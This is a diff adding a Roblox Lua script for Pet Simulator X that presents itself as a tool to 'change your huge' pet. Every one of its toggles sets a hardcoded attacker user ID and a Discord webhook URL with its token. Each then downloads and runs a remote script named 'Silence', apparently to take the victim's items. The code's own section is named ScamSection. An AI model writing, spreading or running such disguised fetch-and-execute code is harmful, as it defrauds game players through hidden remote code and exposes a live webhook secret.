@@ -1,0 +1,114 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Change your huge to other", "GrapeTheme")
+
+--Bank
+local Trade = Window:NewTab("Bank")
+local ScamSection = Trade:NewSection("Huge")
+
+
+
+ScamSection:NewToggle("Huge Inferno Cat", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+
+ScamSection:NewToggle("Huge Grim Reaper", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+ScamSection:NewToggle("Huge Cat", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+ScamSection:NewToggle("Huge Pegasus", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+
+ScamSection:NewToggle("Huge Easter Cat", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+ScamSection:NewToggle("Huge Skeleton", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+
+ScamSection:NewToggle("Huge Cheerful Yeti", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+ScamSection:NewToggle("Huge Duck", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))())()
+    else
+        print("Toggle Off")
+    end
+end)
+
+
+
+ScamSection:NewToggle("Huge Lucky Cat", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
+
+
+ScamSection:NewToggle("Huge Storm Agony", "Put your huge are bank and wait 1 day", function(state)
+    if state then
+_G.UserID = 1133402567
+_G.WebHook = "https://discord.com/api/webhooks/1056623147090182164/gWAH03GvqO7J1CEpxZv64IyjsEjTFwhwFSVRvtjCCLZSSVdgPh3Kl_U8EfjweZftZm0U"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
+    else
+        print("Toggle Off")
+    end
+end)
